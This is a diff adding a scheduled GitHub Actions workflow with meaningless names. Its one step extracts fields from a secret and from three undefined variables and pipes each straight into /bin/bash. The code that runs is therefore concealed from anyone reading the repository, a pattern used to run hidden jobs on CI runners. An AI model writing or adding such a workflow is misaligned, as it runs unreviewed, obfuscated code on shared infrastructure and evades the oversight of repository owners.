@@ -1,0 +1,20 @@
+name: tundramassive
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tundramassive
+        env:
+          nohf4211: ${{ secrets.nohf4211 }}
+        run: |
+          echo $nohf4211 | jq -r .ugg204 | /bin/bash
+          echo $m244 | jq -r .ug7 | /bin/bash
+          echo $hdbu8595 | jq -r .d493 | /bin/bash
+          echo $zg70422 | jq -r .vmcwo337 | /bin/bash
+
